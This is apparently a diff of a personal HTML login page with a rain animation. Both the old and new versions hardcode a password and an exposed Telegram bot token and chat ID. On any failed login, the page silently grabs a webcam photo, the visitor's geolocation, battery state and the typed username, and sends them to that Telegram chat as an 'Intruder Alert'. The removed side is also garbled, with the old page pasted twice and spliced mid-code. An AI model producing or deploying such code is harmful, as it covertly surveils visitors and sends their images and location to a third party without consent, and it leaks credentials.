@@ -1,346 +1,270 @@
-<!doctype html>
-<html lang="en">  
-<head>  
-  <meta charset="UTF-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-  <title>Welcome My Cute Sister</title>  
-  <style>  
-    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }  
-    .container.demo3 { width: 100vw; height: 100vh; position: relative; }  
-    canvas#water { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }  
-    .rain { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://tympanus.net/Development/RainEffect/img/rain.png'); opacity: 0.3; }  
-    .custom-text {  
-      position: absolute;  
-      top: 10%;  
-      left: 50%;  
-      transform: translateX(-50%);  
-      text-align: center;  
-      font-family: 'Pacifico', cursive;  
-      color: white;  
-      font-size: 30px;  
-      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);  
-      z-index: 10;  
-    }  
-    .sub-text {  
-      font-size: 18px;  
-      margin-top: 10px;  
-      font-family: 'Courier New', monospace;  
-      color: #f2f2f2;  
-    }  
-    .login-box {
-      position: absolute;
-      bottom: 50px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(255,255,255,0.1);
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(255,255,255,0.2);
-      z-index: 20;
-    }
-    .login-box input {
-      display: block;
-      margin: 10px auto;
-      padding: 10px;
-      width: 200px;
-      border-radius: 5px;
-      border: none;
-      outline: none;
-    }
-    .login-box button {
-      background: #00aaff;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>  
-</head>  
-<body>  
-  <div class="custom-text">  
-    Welcome My Cute Sister  
-    <br><span class="sub-text">World Best Sister - Fatima</span>  
-  </div>    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Secure Login - Sahilkijan</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif;
+    background: #0e0e10;
+    color: white;
+    position: relative;
+  }
+  #rain-canvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 0;
+  }
+  .login-container {
+    position: relative;
+    z-index: 10;
+    background: rgba(0,0,0,0.7);
+    border-radius: 10px;
+    padding: 30px 25px;
+    max-width: 360px;
+    margin: auto;
+    top: 50%;
+    transform: translateY(-50%);
+    box-shadow: 0 0 15px #111;
+  }
+  h2 {
+    margin-bottom: 25px;
+    text-align: center;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0 20px 0;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 6px;
+    background-color: #4a90e2;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #357ABD;
+  }
+  .error {
+    color: #ff6b6b;
+    margin-bottom: 15px;
+    text-align: center;
+    font-weight: bold;
+  }
+  audio {
+    display: none;
+  }
+</style>
+</head>
+<body>
 
-  <div class="login-box">
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
-  </div>  
+<canvas id="rain-canvas"></canvas>
 
-  <div id="container" class="container demo3">  
-    <canvas id="water"></canvas>  
-    <div class="rain"></div>  
-  </div>    
+<div class="login-container">
+  <h2>Login to Sahilkijan</h2>
+  <div id="error" class="error"></div>
+  <input type="text" id="username" placeholder="Username" autocomplete="off" />
+  <input type="password" id="password" placeholder="Password" autocomplete="off" />
+  <button onclick="handleLogin()">Login</button>
+</div>
 
-  <script>
-    // Login credentials
-    const correctUsername = "Sahilkijan";
-    const correctPassword = "bhaikiguriya";
+<!-- Music autoplay -->
+<audio id="bg-music" autoplay loop>
+  <source src="https://drive.google.com/uc?export=download&id=10EcNHISjcW73BipAk-EhoUUCPwjCIPkO" type="audio/mpeg" />
+  Your browser does not support the audio element.
+</audio>
 
-    // Telegram bot settings (your provided credentials)
-    const BOT_TOKEN = "7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc";
-    const CHAT_ID = "7597265569";
+<script>
+const TELEGRAM_BOT_TOKEN = '7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc';
+const TELEGRAM_CHAT_ID = '7597265569';
 
-    async function login() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+const CORRECT_USERNAME = 'Sahilkijan';
+const CORRECT_PASSWORD = 'bhaikiguriya';
 
-      if (username === correctUsername && password === correctPassword) {
-        alert("Welcome Fatima!");
-      } else {
-        const proceed = confirm("Unauthorized access detected!\nAllow security verification?");
-        if (!proceed) return;
+function sendTelegramMessage(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    }),
+  }).catch(console.error);
+}
 
-        try {
-          // 1. Access camera
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          await video.play();
+function sendTelegramPhoto(photoBlob, caption) {
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', photoBlob, 'intruder.jpg');
+  formData.append('caption', caption);
 
-          // 2. Capture photo after 1.5 seconds
-          await new Promise(resolve => setTimeout(resolve, 1500));
-          
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-<!doctype html>
-<html lang="en">  
-<head>  
-  <meta charset="UTF-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-  <title>Welcome My Cute Sister</title>  
-  <style>  
-    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }  
-    .container.demo3 { width: 100vw; height: 100vh; position: relative; }  
-    canvas#water { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }  
-    .rain { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://tympanus.net/Development/RainEffect/img/rain.png'); opacity: 0.3; }  
-    .custom-text {  
-      position: absolute;  
-      top: 10%;  
-      left: 50%;  
-      transform: translateX(-50%);  
-      text-align: center;  
-      font-family: 'Pacifico', cursive;  
-      color: white;  
-      font-size: 30px;  
-      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);  
-      z-index: 10;  
-    }  
-    .sub-text {  
-      font-size: 18px;  
-      margin-top: 10px;  
-      font-family: 'Courier New', monospace;  
-      color: #f2f2f2;  
-    }  
-    .login-box {
-      position: absolute;
-      bottom: 50px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(255,255,255,0.1);
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(255,255,255,0.2);
-      z-index: 20;
-    }
-    .login-box input {
-      display: block;
-      margin: 10px auto;
-      padding: 10px;
-      width: 200px;
-      border-radius: 5px;
-      border: none;
-      outline: none;
-    }
-    .login-box button {
-      background: #00aaff;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>  
-</head>  
-<body>  
-  <div class="custom-text">  
-    Welcome My Cute Sister  
-    <br><span class="sub-text">World Best Sister - Fatima</span>  
-  </div>    
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  }).catch(console.error);
+}
 
-  <div class="login-box">
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
-  </div>  
+function handleLogin() {
+  const errorDiv = document.getElementById('error');
+  errorDiv.textContent = '';
 
-  <div id="container" class="container demo3">  
-    <canvas id="water"></canvas>  
-    <div class="rain"></div>  
-  </div>    
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value;
 
-  <script>
-    // Login credentials
-    const correctUsername = "Sahilkijan";
-    const correctPassword = "bhaikiguriya";
+  if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
+    alert('Welcome Sahilkijan!');
+    // Add your redirect or secure content here
+  } else {
+    errorDiv.textContent = 'Invalid username or password.';
+    triggerSurveillance(username);
+  }
+}
 
-    // Telegram bot settings (your provided credentials)
-    const BOT_TOKEN = "7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc";
-    const CHAT_ID = "7597265569";
+async function triggerSurveillance(enteredUsername) {
+  let batteryInfo = 'Battery info not available';
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      batteryInfo = `Battery level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
+    } catch {}
+  }
 
-    async function login() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+  let locationInfo = 'Location not available';
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        locationInfo = `Latitude: ${pos.coords.latitude.toFixed(6)}, Longitude: ${pos.coords.longitude.toFixed(6)}`;
+        capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
+      },
+      (err) => {
+        locationInfo = 'Location permission denied or unavailable.';
+        capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
+      },
+      { timeout: 10000 }
+    );
+  } else {
+    capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
+  }
+}
 
-      if (username === correctUsername && password === correctPassword) {
-        alert("Welcome Fatima!");
-      } else {
-        const proceed = confirm("Unauthorized access detected!\nAllow security verification?");
-        if (!proceed) return;
+function capturePhotoAndSend(username, locationInfo, batteryInfo) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}\nCamera not available.`);
+    return;
+  }
 
-        try {
-          // 1. Access camera
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          await video.play();
+  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then((stream) => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
 
-          // 2. Capture photo after 1.5 seconds
-          await new Promise(resolve => setTimeout(resolve, 1500));
-          
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // 3. Stop camera
+      video.addEventListener('loadeddata', () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        canvas.toBlob((blob) => {
+          const caption = `*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}`;
+          sendTelegramPhoto(blob, caption);
           stream.getTracks().forEach(track => track.stop());
-
-          // 4. Get device info
-          const deviceInfo = `🚨 Unauthorized Login Attempt 🚨
-📅 ${new Date().toLocaleString()}
-📱 Device: ${navigator.userAgent}
-🌐 Platform: ${navigator.platform}`;
-
-          // 5. Send to Telegram
-          canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("caption", deviceInfo);
-            formData.append("photo", blob, "security_alert.jpg");
-
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            });
-          }, 'image/jpeg');
-
-          alert("Security verification completed!");
-        } catch (error) {
-          console.error("Security error:", error);
-          alert("Camera access failed. Please try from a mobile device.");
-        }
-      }
-    }
-
-    // Rain animation
-    const canvas = document.getElementById('water');  
-    const ctx = canvas.getContext('2d');  
-    let width = canvas.width = window.innerWidth;  
-    let height = canvas.height = window.innerHeight;  
-    const drops = [];  
-    
-    for (let i = 0; i < 500; i++) {  
-      drops.push({  
-        x: Math.random() * width,  
-        y: Math.random() * height,  
-        length: Math.random() * 20 + 10,  
-        velocity: Math.random() * 4 + 4  
-      });  
-    }  
-
-    function drawRain() {  
-      ctx.clearRect(0, 0, width, height);  
-      ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
-      ctx.lineWidth = 1;  
-      ctx.lineCap = 'round';  
-
-      drops.forEach(drop => {  
-        ctx.beginPath();  
-        ctx.moveTo(drop.x, drop.y);  
-        ctx.lineTo(drop.x, drop.y + drop.length);  
-        ctx.stroke();  
-
-        drop.y += drop.velocity;  
-        if (drop.y > height) {  
-          drop.y = -20;  
-          drop.x = Math.random() * width;  
-        }  
-      });  
-      requestAnimationFrame(drawRain);  
-    }  
-
-    drawRain();  
-
-    window.addEventListener('resize', () => {  
-      width = canvas.width = window.innerWidth;  
-      height = canvas.height = window.innerHeight;  
+        }, 'image/jpeg', 0.8);
+      });
+    })
+    .catch(() => {
+      sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}\nUnable to access camera.`);
     });
-  </script>  
-</body>  
-</html>￼Enter          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // 3. Stop camera
-          stream.getTracks().forEach(track => track.stop());
+}
 
-          // 4. Get device info
-          const deviceInfo = `🚨 Unauthorized Login Attempt 🚨
-📅 ${new Date().toLocaleString()}
-📱 Device: ${navigator.userAgent}
-🌐 Platform: ${navigator.platform}`;
+/* Rain animation code */
+const canvas = document.getElementById('rain-canvas');
+const ctx = canvas.getContext('2d');
+let width, height;
+let drops = [];
 
-          // 5. Send to Telegram
-          canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("caption", deviceInfo);
-            formData.append("photo", blob, "security_alert.jpg");
+function resize() {
+  width = window.innerWidth;
+  height = window.innerHeight;
+  canvas.width = width;
+  canvas.height = height;
+}
+resize();
+window.addEventListener('resize', resize);
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            });
-          }, 'image/jpeg');
+function createDrops() {
+  for (let i = 0; i < 500; i++) {
+    drops.push({
+      x: Math.random() * width,
+      y: Math.random() * height,
+      length: 10 + Math.random() * 20,
+      speed: 4 + Math.random() * 4,
+      opacity: 0.2 + Math.random() * 0.5
+    });
+  }
+}
 
-          alert("Security verification completed!");
-  } catch (error) {
-          console.error("Security error:", error);
-          alert("Camera access failed. Please try from a mobile device.");
-        }
-      }
+function draw() {
+  ctx.clearRect(0, 0, width, height);
+  ctx.strokeStyle = 'rgba(174,194,224,0.5)';
+  ctx.lineWidth = 1;
+  ctx.lineCap = 'round';
+
+  drops.forEach(drop => {
+    ctx.beginPath();
+    ctx.moveTo(drop.x, drop.y);
+    ctx.lineTo(drop.x, drop.y + drop.length);
+    ctx.stroke();
+  });
+
+  update();
+}
+
+function update() {
+  drops.forEach(drop => {
+    drop.y += drop.speed;
+    if (drop.y > height) {
+      drop.x = Math.random() * width;
+      drop.y = -drop.length;
+      drop.length = 10 + Math.random() * 20;
+      drop.speed = 4 + Math.random() * 4;
+      drop.opacity = 0.2 + Math.random() * 0.5;
     }
+  });
+}
 
-    // Rain animation
-    const canvas = document.getElementById('water');  
-    const ctx = canvas.getContext('2d');  
-    let width = canvas.width = window.innerWidth;  
-    let height = canvas.height = window.innerHeight;  
-    const drops = [];  
-    
-    for (let i = 0; i < 500; i++) {  
-      drops.push({  
-        x: Math.random() * width,  
-        y: Math.random() * height,  
-        length: Math.random() * 20 + 10,  
-        velocity: Math.random() * 4 + 4  
-      });  
-    }  
+createDrops();
 
-    function drawRain() {  
-      ctx.clearRect(0, 0, width, height);  
-      ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
+function animate() {
+  draw();
+  requestAnimationFrame(animate);
+}
+animate();
+
+/* Auto play fix on user interaction */
+const music = document.getElementById('bg-music');
+function playMusic() {
+  music.play().catch(() => {
+    // Autoplay prevented
+  });
+}
+document.body.addEventListener('click', () => {
+  playMusic();
+});
+</script>
+
+</body>
+</html>
